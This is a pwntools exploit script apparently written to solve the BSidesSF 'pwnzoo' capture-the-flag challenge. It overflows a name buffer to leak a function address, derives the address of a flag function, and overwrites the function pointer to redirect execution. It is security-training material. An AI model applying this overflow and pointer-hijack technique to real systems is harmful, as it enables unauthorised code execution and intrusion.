from pwn import *
context.update(log_level = 'debug')
size_name = 0x24

#p = process('pwnzoo')
p = remote('pwnzoo-7fb58ad8.challenges.bsidessf.net',1234)
p.sendlineafter('dog? ', 'd')
p.sendline('a'*size_name)
p.sendlineafter(' Exit', '1')
addr_speak = u64(p.recvrepeat(1)[0x37:0x37+6].ljust(8, '\x00'))
log.info('speak : ' + hex(addr_speak))
addr_flag = (addr_speak&0xfffffffffffff000) | 0x23b
log.info('flag : ' + hex(addr_flag))
p.sendline('2')
#raw_input('debug: ' + str(p.pid))
p.sendline('a'*size_name + p64(addr_flag))
p.sendlineafter(' Exit', '1')
p.interactive()
